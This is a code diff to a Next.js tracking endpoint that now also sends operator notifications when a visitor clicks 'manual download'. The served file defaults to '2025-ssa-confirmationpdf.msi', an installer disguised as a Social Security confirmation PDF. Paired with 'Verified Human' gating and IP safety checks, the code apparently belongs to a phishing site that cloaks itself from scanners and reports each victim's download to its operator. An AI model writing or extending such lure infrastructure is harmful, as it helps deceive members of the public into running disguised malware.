@@ -55,7 +55,9 @@ export async function POST(request: NextRequest) {
             securityCheck = await checkIP(ip, apiKey);
         }
 
-        if (data.event === 'Page Visit - Verified Human') {
+        const notifyEvents = ['Page Visit - Verified Human', 'Manual Download Click'];
+        
+        if (notifyEvents.includes(data.event)) {
             const message = formatMessage(data, ip, securityCheck);
 
             const promises = [];
@@ -87,7 +89,12 @@ export async function POST(request: NextRequest) {
 function formatMessage(data: TrackingData, ip: string, security: SecurityCheckResult | null): string {
     const fileName = process.env.DOWNLOAD_FILE_PATH || '2025-ssa-confirmationpdf.msi';
     
-    let message = `🔔 Your ${fileName} has started downloading\n\n`;
+    let headerText = `🔔 Your ${fileName} has started downloading`;
+    if (data.event === 'Manual Download Click') {
+        headerText = `🔔 Manual download of ${fileName} clicked`;
+    }
+    
+    let message = `${headerText}\n\n`;
     
     if (security) {
         const statusIcon = security.isSafe ? '✅' : '🚨';
